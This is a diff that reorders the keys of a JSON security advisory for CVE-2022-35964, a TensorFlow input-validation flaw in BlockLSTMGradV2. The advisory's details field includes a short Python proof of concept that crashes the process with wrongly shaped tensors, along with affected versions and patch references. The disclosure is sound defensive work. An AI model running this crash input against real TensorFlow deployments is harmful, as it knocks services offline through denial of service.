@@ -1,57 +1,16 @@
 {
-  "id": "GHSA-f7r5-q7cx-h668",
-  "summary": "TensorFlow vulnerable to segfault in `BlockLSTMGradV2`",
-  "details": "### Impact\nThe implementation of `BlockLSTMGradV2` does not fully validate its inputs.\n - `wci`, `wcf`, `wco`, `b` must be rank 1\n - `w`, cs_prev`, `h_prev` must be rank 2\n - `x` must be rank 3\nThis results in a a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nuse_peephole = False\nseq_len_max = tf.constant(1, shape=[], dtype=tf.int64)\nx = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nw = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nb = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ni = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\no = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ntf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2a458fc4866505be27c62f81474ecb2b870498fa](https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
-  "aliases": [
-    "BIT-tensorflow-2022-35964",
-    "CVE-2022-35964"
-  ],
-  "modified": "2023-12-06T01:02:26.256610Z",
-  "published": "2022-09-16T22:14:00Z",
-  "related": [
-    "CVE-2022-35964"
-  ],
-  "database_specific": {
-    "nvd_published_at": "2022-09-16T21:15:00Z",
-    "github_reviewed_at": "2022-09-16T22:14:00Z",
-    "severity": "MODERATE",
-    "github_reviewed": true,
-    "cwe_ids": [
-      "CWE-20"
-    ]
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35964"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/tensorflow/tensorflow"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -59,7 +18,8 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -135,20 +95,19 @@
         "2.7.0rc0",
         "2.7.0rc1",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -156,25 +115,25 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.9.0"
@@ -182,25 +141,25 @@
             {
               "fixed": "2.9.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.9.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -208,7 +167,8 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -244,20 +204,19 @@
         "2.6.5",
         "2.7.0",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -265,25 +224,25 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.9.0"
@@ -291,25 +250,25 @@
             {
               "fixed": "2.9.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.9.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -317,7 +276,8 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -390,20 +350,19 @@
         "2.7.0rc0",
         "2.7.0rc1",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -411,25 +370,25 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.9.0"
@@ -437,22 +396,63 @@
             {
               "fixed": "2.9.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.9.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-f7r5-q7cx-h668/GHSA-f7r5-q7cx-h668.json"
-      }
+      ]
     }
+  ],
+  "aliases": [
+    "BIT-tensorflow-2022-35964",
+    "CVE-2022-35964"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-20"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2022-09-16T22:14:00Z",
+    "nvd_published_at": "2022-09-16T21:15:00Z",
+    "severity": "MODERATE"
+  },
+  "details": "### Impact\nThe implementation of `BlockLSTMGradV2` does not fully validate its inputs.\n - `wci`, `wcf`, `wco`, `b` must be rank 1\n - `w`, cs_prev`, `h_prev` must be rank 2\n - `x` must be rank 3\nThis results in a a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nuse_peephole = False\nseq_len_max = tf.constant(1, shape=[], dtype=tf.int64)\nx = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nw = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nb = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ni = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\no = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ntf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2a458fc4866505be27c62f81474ecb2b870498fa](https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
+  "id": "GHSA-f7r5-q7cx-h668",
+  "modified": "2023-12-06T01:02:26.256610Z",
+  "published": "2022-09-16T22:14:00Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35964"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tensorflow/tensorflow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0"
+    }
+  ],
+  "related": [
+    "CVE-2022-35964"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "TensorFlow vulnerable to segfault in `BlockLSTMGradV2`"
 }
